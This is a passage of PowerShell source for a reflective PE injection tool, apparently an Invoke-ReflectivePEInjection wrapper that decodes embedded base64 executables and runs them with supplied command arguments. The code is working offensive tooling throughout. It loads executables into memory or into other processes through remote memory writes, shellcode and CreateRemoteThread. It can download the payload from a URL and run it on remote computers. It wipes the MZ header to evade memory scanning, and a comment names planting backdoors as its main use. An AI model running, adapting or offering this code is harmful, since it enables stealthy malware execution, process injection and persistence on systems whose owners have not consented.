		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position = 3)]
		[Bool]
		$ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		#ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		$PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
		elseif ($ForceASLR -and (-not $PESupportsASLR))
		{
			Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
		}

		if ($ForceASLR -and $RemoteLoading)
		{
			Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
		}
		if ($RemoteLoading -and (-not $PESupportsASLR))
		{
			Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
		}

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
			switch ($FuncReturnType)
			{
				'WString' {
					Write-Verbose "Calling function with WString return type"
					[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
					if ($WStringFuncAddr -eq [IntPtr]::Zero)
					{
						Throw "Couldn't find function address."
					}
					$WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
					$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
					[IntPtr]$OutputPtr = $WStringFunc.Invoke()
					$Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
					Write-Output $Output
				}

				'String' {
					Write-Verbose "Calling function with String return type"
					[IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
					if ($StringFuncAddr -eq [IntPtr]::Zero)
					{
						Throw "Couldn't find function address."
					}
					$StringFuncDelegate = Get-DelegateType @() ([IntPtr])
					$StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
					[IntPtr]$OutputPtr = $StringFunc.Invoke()
					$Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
					Write-Output $Output
				}

				'Void' {
					Write-Verbose "Calling function with Void return type"
					[IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
					if ($VoidFuncAddr -eq [IntPtr]::Zero)
					{
						Throw "Couldn't find function address."
					}
					$VoidFuncDelegate = Get-DelegateType @() ([Void])
					$VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
					$VoidFunc.Invoke() | Out-Null
				}
			}
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
		#Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	{
		Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
		[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	}
	elseif ($PsCmdlet.ParameterSetName -ieq "WebFile")
	{
		$WebClient = New-Object System.Net.WebClient
		
		[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
	}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

	if ($e_magic -ne 'MZ')
	{
		throw 'PE is not a valid PE file.'
	}

	# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
	# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
	$PEBytes[0] = 0
	$PEBytes[1] = 0
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
	function Main{
		if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
		{
			[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
		}
		else
		{
			[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
		}
		Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command
	}
Main
}

Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	$ExeArgs = "$Method $Command"

	[System.IO.Directory]::SetCurrentDirectory($pwd)

	
